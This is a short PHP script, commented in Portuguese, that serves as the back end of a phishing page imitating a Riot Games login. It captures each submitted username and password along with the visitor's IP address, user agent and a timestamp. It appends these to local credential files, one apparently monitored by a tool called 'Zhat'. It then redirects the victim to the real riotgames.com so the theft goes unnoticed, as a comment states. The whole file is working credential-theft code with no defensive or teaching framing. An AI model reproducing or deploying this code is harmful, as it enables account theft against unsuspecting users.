<?php
// login.php - Captura as credenciais

// Pega os dados do formulário
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Pega informações adicionais
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Prepara os dados para salvar
$data = "\n";
$data .= "═══════════════════════════════════════════\n";
$data .= "📅 Data/Hora: $timestamp\n";
$data .= "🌐 IP: $ip\n";
$data .= "📱 User-Agent: $user_agent\n";
$data .= "👤 Username: $username\n";
$data .= "🔑 Password: $password\n";
$data .= "═══════════════════════════════════════════\n";

// Salva no arquivo de credenciais (para o Zhat)
file_put_contents('../auth/credentials.txt', $data, FILE_APPEND | LOCK_EX);

// Salva no arquivo temporário (para o Zhat monitorar)
file_put_contents('usernames.txt', "Username: $username | Password: $password\n", FILE_APPEND | LOCK_EX);

// Redireciona para o site verdadeiro (a vítima nem percebe)
header('Location: https://www.riotgames.com');
exit;
?>